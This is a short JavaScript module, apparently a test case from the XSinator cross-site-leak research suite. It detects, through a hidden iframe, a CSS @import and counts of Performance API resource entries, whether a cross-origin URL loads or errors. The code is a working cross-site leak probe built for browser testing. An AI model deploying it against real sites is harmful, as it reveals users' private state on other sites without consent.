const leak = async (url) => {
    return new Promise(r => {
        let iframe = document.createElement('iframe')

        // handle iframe report
        window.onmessage = async (e) => {
            await sleep(1000)
            let perf = iframe.contentWindow.performance.getEntriesByType("resource")
            
            console.debug(perf)
            iframe.remove()

            // number of requests
            let n = perf.filter(e=>e.name === url).length

            // parse results
            if(n === 2){
                return r(1)
            }
            else if(n === 1){
                return r(0)
            }
            // safari does not log 500
            // maybe take this out
            else if(n === 0){
                return r(1)
            }

            else{
                // Something went wrong
                console.debug(`requests: ${n}`)
                return r(`requests: ${n}`)
            }
        }

        // timeout if no message
        setTimeout(() => {
            iframe.remove()
            return r(0)
        }, 5000)


        
        iframe.srcdoc = `
        <html>
        <body>
                <script onload="parent.postMessage('', '*')"
                    src='https://xsinator.com/3sleep'><\/script>
                <style>
                    @import '${url}';
                <\/style>
                
        </body>
        </html>`


        // start the test
        document.body.appendChild(iframe)
    })
}


const sleep = (ms) => {
    return new Promise((r) => setTimeout(r,ms))
}

export { leak }